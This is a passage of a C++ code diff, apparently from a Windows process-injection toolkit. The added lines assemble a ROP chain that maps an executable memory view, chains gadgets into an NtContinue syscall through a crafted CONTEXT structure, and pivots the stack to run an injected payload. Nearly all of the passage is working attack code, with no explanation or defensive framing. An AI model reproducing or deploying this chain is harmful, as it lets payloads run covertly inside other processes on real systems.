+	ROP_chain[rop_pos++] = 0; //
+	DWORD64 view_size_pos = rop_pos++;
+	ROP_chain[rop_pos++] = 2; // ViewUnmap
+	ROP_chain[rop_pos++] = 0x100000; // MEM_TOP_DOWN
+	ROP_chain[rop_pos++] = PAGE_EXECUTE_READWRITE;
+	ROP_chain[rop_pos++] = DONT_CARE; // skip
+
+	ROP_chain[payload_address_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos; // Run Payload
+	ROP_chain[rop_pos++] = 0;
+	ROP_chain[rop_pos++] = GADGET_addrsp28;
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	
+	// NtContinue via Rite Of Passage
+	ROP_chain[rop_pos++] = GADGET_popregs; // pop registers
+	ROP_chain[rop_pos++] = 0x43; // NtContinue ISR value
+	ROP_chain[rop_pos++] = 0; // rdx (HANDLE Process)
+	DWORD64 context2_pos = rop_pos++; // parameter of CONTEXT* // rcx (HANDLE Section)
+	ROP_chain[rop_pos++] = DONT_CARE; // r8
+	ROP_chain[rop_pos++] = DONT_CARE; // r9
+	DWORD64 context3_pos = rop_pos++; // parameter of CONTEXT* // rcx (HANDLE Section)
+	ROP_chain[rop_pos++] = DONT_CARE; // r11
+	ROP_chain[rop_pos++] = GADGET_syscall;
+	ROP_chain[rop_pos++] = GADGET_addrsp28;	// (We will never get there)
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+
+
+
+	ROP_chain[view_size_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	ROP_chain[rop_pos++] = PAYLOAD2_SIZE;
+
+
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
+	ROP_chain[context_pos] = (runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos) & 0xFFFFFFFFFFFFFFF0;
+	rop_pos += (sizeof(CONTEXT) + 0x100) / sizeof(DWORD64);
+	ROP_chain[context2_pos] = ROP_chain[context_pos];
+	ROP_chain[context3_pos] = ROP_chain[context_pos];
+	ROP_chain[context_rcx_pos] = ROP_chain[context_pos] + (DWORD64)(&((CONTEXT*)0)->Rcx);
+	ROP_chain[context_rip_pos] = ROP_chain[context_pos] + (DWORD64)(&((CONTEXT*)0)->Rip);
+	ROP_chain[context_rsp_pos] = ROP_chain[context_pos] + (DWORD64)(&((CONTEXT*)0)->Rsp);
+
+	// Update Runtime Parameters with ROP-specific Parameters
+	runtime_parameters["rop_pos"] = rop_pos;
+
+	output->buffer = ROP_chain;
+	output->buffer_size = 0x1000 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
+	output->metadata = &runtime_parameters;
+
+	state->Rip = GADGET_savercx;
+	state->Rsp = runtime_parameters["tos"];
 
 	return output;
 }
